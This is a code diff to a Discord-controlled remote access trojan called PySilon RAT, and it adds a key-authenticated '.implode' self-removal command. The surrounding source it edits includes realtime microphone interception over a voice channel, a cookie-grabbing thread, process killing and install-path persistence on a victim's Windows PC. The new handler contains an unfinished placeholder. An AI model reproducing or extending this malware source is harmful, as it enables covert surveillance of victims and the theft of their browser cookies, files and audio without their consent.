@@ -57,7 +57,7 @@ channel_ids = {
     'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
 }
 
-access_code = 'zaq1@WSX'   # Set access code for ".update" and ".implode" commands that can result in errors shutting down the malware
+secret_key = '85f7ece84d246d848deea3fe275c5847f374a2103acdf7bd0bb4804bee258c46'   # Don't touch this line (just leave)
 
 # -            End of config           - #
 # - Don't change anything below unless - #
@@ -70,7 +70,7 @@ text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
-cookies_thread = None
+cookies_thread, implode_confirmation = None, None
 working_directory = sys.argv[0].split('\\')[:-1]
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
@@ -139,7 +139,7 @@ async def on_raw_reaction_add(payload):
 
 @client.event
 async def on_reaction_add(reaction, user):
-    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill
+    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, implode_confirmation, expectation
     if user.bot == False:
         try:
             match str(reaction):
@@ -228,6 +228,10 @@ async def on_reaction_add(reaction, user):
                         except Exception as e:
                             reaction_msg = await reaction.message.channel.send('```Error while killing processes...\n' + str(e) + '```')
                             await reaction_msg.add_reaction('🔴')
+                    
+                    elif reaction.message == implode_confirmation and expectation == 'implosion':
+                        implode_stuff
+
         except: pass
 
 @client.event
@@ -241,7 +245,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation
     if message.author != client.user:
         if message.content == '.ss':
             await message.delete()
@@ -499,6 +503,24 @@ async def on_message(message):
                         reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
             else:
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content == '.implode':
+            await message.delete()
+            await message.channel.send('``` `````` `````` `````` `````` ```||❗||\n||❗||\n||❗||```Send here PySilon.key generated along with RAT executable```||❗||\n||❗||\n||❗||')
+            expectation = 'key'
+
+
+        elif expectation == 'key':
+            split_v1 = str(message.attachments).split("filename='")[1]
+            filename = str(split_v1).split("' ")[0]
+            await message.attachments[0].save(fp=filename)
+            if get_file_hash(filename) == secret_key:
+                reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
+                await reaction_msg.add_reaction('💀')
+                await reaction_msg.add_reaction('🔴')
+                implode_confirmation, expectation = reaction_msg, 'implosion'
+            else:
+                print('no')
 
 
         elif expectation == 'onefile':
